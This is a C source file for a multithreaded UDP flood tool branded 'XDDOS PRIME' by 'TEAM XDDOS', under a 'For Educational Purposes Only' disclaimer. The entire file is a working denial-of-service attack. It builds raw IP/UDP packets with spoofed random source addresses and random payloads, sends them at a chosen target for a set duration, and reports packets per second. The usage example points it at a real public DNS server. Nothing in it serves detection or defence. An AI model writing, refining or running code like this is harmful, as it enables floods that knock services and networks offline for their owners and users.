/*
 * rawudp.c - XDDOS PRIME - UDP Flood Tool
 * TEAM XDDOS
 *   XDMEOW - Shadow
 *   XDCAT  - Vansh
 *
 * "For Educational Purposes Only"
 */

#define _DEFAULT_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>

/* ─────────────────────────────────────────────
 * Globals
 * ───────────────────────────────────────────── */
static volatile unsigned long total_packets = 0;
static volatile unsigned long pps_counter   = 0;

/* ─────────────────────────────────────────────
 * CMWC (Complementary Multiply-With-Carry) PRNG
 * Period: ~2^131086
 * ───────────────────────────────────────────── */
#define CMWC_CYCLE 4096

static uint32_t Q[CMWC_CYCLE];
static uint32_t cmwc_c = 362436;
static int      cmwc_i = CMWC_CYCLE - 1;

void init_rand(void)
{
    srand(time(NULL));
    for (int i = 0; i < CMWC_CYCLE; i++)
        Q[i] = rand();
}

uint32_t rand_cmwc(void)
{
    uint64_t a = 18782ULL;
    uint32_t r = 0xFFFFFFFE;

    cmwc_i = (cmwc_i + 1) & (CMWC_CYCLE - 1);
    uint64_t t = a * Q[cmwc_i] + cmwc_c;
    cmwc_c = (uint32_t)(t >> 32);
    uint32_t x = (uint32_t)(t + cmwc_c);

    if (x < cmwc_c) {
        x++;
        cmwc_c++;
    }

    return (Q[cmwc_i] = r - x);
}

/* ─────────────────────────────────────────────
 * IP / UDP Checksum
 * ───────────────────────────────────────────── */
unsigned short csum(unsigned short *buf, int nwords)
{
    unsigned long sum = 0;

    for (; nwords > 0; nwords--)
        sum += *buf++;

    sum  = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);

    return (unsigned short)(~sum);
}

/* ─────────────────────────────────────────────
 * Packet header construction
 * ───────────────────────────────────────────── */
#define PAYLOAD_SIZE 512
#define PACKET_SIZE  (sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOAD_SIZE)

void setup_ip_header(struct iphdr *iph, uint32_t saddr, uint32_t daddr)
{
    iph->ihl      = 5;
    iph->version  = 4;
    iph->tos      = 0;
    iph->tot_len  = htons(PACKET_SIZE);
    iph->id       = htons(rand_cmwc() & 0xFFFF);
    iph->frag_off = 0;
    iph->ttl      = 255;
    iph->protocol = IPPROTO_UDP;
    iph->check    = 0;
    iph->saddr    = saddr;
    iph->daddr    = daddr;
    iph->check    = csum((unsigned short *)iph, sizeof(struct iphdr) / 2);
}

void setup_udp_header(struct udphdr *udph, int target_port)
{
    udph->source = htons(rand_cmwc() & 0xFFFF);
    udph->dest   = htons(target_port);
    udph->len    = htons(sizeof(struct udphdr) + PAYLOAD_SIZE);
    udph->check  = 0;   /* UDP checksum optional in IPv4 */
}

/* ─────────────────────────────────────────────
 * Flood thread parameters
 * ───────────────────────────────────────────── */
struct flood_params {
    int   thread_id;
    char *target_ip;
    int   target_port;
    int   throttle;
    int   duration;
};

/* ─────────────────────────────────────────────
 * Flood thread worker
 * ───────────────────────────────────────────── */
void *flood(void *arg)
{
    struct flood_params *params = (struct flood_params *)arg;
    const char *mode_str;
    int sock;

    /* Try RAW socket first, fall back to DGRAM */
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock >= 0) {
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        mode_str = "RAW";
    } else {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        mode_str = "DGRAM";
    }

    if (sock < 0) {
        fprintf(stderr, "\033[1;31m[Thread %d] Socket creation failed: %s\033[0m\n",
                params->thread_id, strerror(errno));
        return NULL;
    }

    fcntl(sock, F_SETFL, O_NONBLOCK);

    fprintf(stdout, "\033[1;37m[Thread %d] \033[1;32mStarted in %s mode\033[0m\n",
            params->thread_id, mode_str);
    fflush(stdout);

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family      = AF_INET;
    dest.sin_port        = htons(params->target_port);
    dest.sin_addr.s_addr = inet_addr(params->target_ip);

    char packet[PACKET_SIZE];
    struct iphdr  *iph  = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *payload       = packet + sizeof(struct iphdr) + sizeof(struct udphdr);

    time_t start = time(NULL);

    while (time(NULL) - start < params->duration) {
        memset(packet, 0, PACKET_SIZE);

        /* Random payload */
        for (int i = 0; i < PAYLOAD_SIZE; i++)
            payload[i] = (char)(rand_cmwc() & 0xFF);

        /* Spoofed source IP */
        uint32_t src_ip = htonl(rand_cmwc());

        setup_ip_header(iph, src_ip, dest.sin_addr.s_addr);
        setup_udp_header(udph, params->target_port);

        sendto(sock, packet, PACKET_SIZE, 0,
               (struct sockaddr *)&dest, sizeof(dest));

        total_packets++;
        pps_counter++;

        if (params->throttle > 0)
            usleep(params->throttle);
    }

    close(sock);
    return NULL;
}

/* ─────────────────────────────────────────────
 * Banner
 * ───────────────────────────────────────────── */
void print_banner(void)
{
    printf("\033[2J\033[H");
    printf("\033[1;31m\n");
    printf("    ██╗  ██╗██████╗ ██████╗  ██████╗ ███████╗\n");
    printf("    ╚██╗██╔╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝\n");
    printf("\033[1;37m");
    printf("     ╚███╔╝ ██║  ██║██║  ██║██║   ██║███████╗\n");
    printf("     ██╔██╗ ██║  ██║██║  ██║██║   ██║╚════██║\n");
    printf("    ██╔╝ ██╗██████╔╝██████╔╝╚██████╔╝███████║\n");
    printf("    ╚═╝  ╚═╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝\n");
    printf("\033[1;35m");
    printf("    ██████╗ ██████╗ ██╗███╗   ███╗███████╗\n");
    printf("    ██╔══██╗██╔══██╗██║████╗ ████║██╔════╝\n");
    printf("    ██████╔╝██████╔╝██║██╔████╔██║█████╗  \n");
    printf("    ██╔═══╝ ██╔══██╗██║██║╚██╔╝██║██╔══╝  \n");
    printf("    ██║     ██║  ██║██║██║ ╚═╝ ██║███████╗\n");
    printf("    ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚══════╝\n");
    printf("\033[0m\n");
    printf("\033[1;37m          TEAM XDDOS\033[0m\n");
    printf("\033[1;36m      XDMEOW - \033[1;31mShadow\033[0m\n");
    printf("\033[1;36m      XDCAT  - \033[1;31mVansh\033[0m\n");
    printf("\033[1;33m          For Educational Purposes Only\033[0m\n\n");
}

/* ─────────────────────────────────────────────
 * Main
 * ───────────────────────────────────────────── */
int main(int argc, char *argv[])
{
    print_banner();

    if (argc != 6) {
        fprintf(stderr, "\033[1;31mInvalid parameters!\033[0m\n");
        fprintf(stderr, "\033[1;37mUsage: %s <IP> <PORT> <throttle> <threads> <duration>\033[0m\n", argv[0]);
        fprintf(stderr, "\033[1;37mExample: %s 8.8.8.8 53 0 16 60\033[0m\n", argv[0]);
        exit(1);
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int throttle    = atoi(argv[3]);
    int num_threads = atoi(argv[4]);
    int duration    = atoi(argv[5]);

    printf("\033[1;37m[+] Target: \033[1;31m%s:%d\033[0m\n", target_ip, target_port);
    printf("\033[1;37m[+] Threads: \033[1;31m%d\033[0m\n", num_threads);
    printf("\033[1;37m[+] Duration: \033[1;31m%d seconds\033[0m\n", duration);
    printf("\033[1;37m[+] Throttle: \033[1;31m%d\033[0m\n", throttle);
    printf("\033[1;37m[+] Setting up sockets...\033[0m\n");

    init_rand();

    pthread_t threads[num_threads];
    struct flood_params params[num_threads];

    for (int i = 0; i < num_threads; i++) {
        params[i].thread_id   = i;
        params[i].target_ip   = target_ip;
        params[i].target_port = target_port;
        params[i].throttle    = throttle;
        params[i].duration    = duration;
        pthread_create(&threads[i], NULL, flood, &params[i]);
    }

    printf("\033[1;31m[+] FLOODING STARTED!\033[0m\n");

    /* PPS monitoring loop */
    time_t start = time(NULL);
    while (time(NULL) - start < duration) {
        pps_counter = 0;
        sleep(1);
        printf("\r\033[1;37m[*] PPS: \033[1;31m%lu \033[1;37m| Total: \033[1;31m%lu     \033[0m",
               pps_counter, total_packets);
        fflush(stdout);
    }

    /* Wait for all threads to finish */
    for (int i = 0; i < num_threads; i++)
        pthread_join(threads[i], NULL);

    printf("\n\033[1;31m[+] Attack completed!\033[0m\n");
    printf("\033[1;37m[+] Total packets sent: \033[1;31m%lu\033[0m\n", total_packets);
    printf("\033[1;37m[+] Average PPS: \033[1;31m%lu\033[0m\n",
           duration > 0 ? total_packets / duration : 0);

    return 0;
}
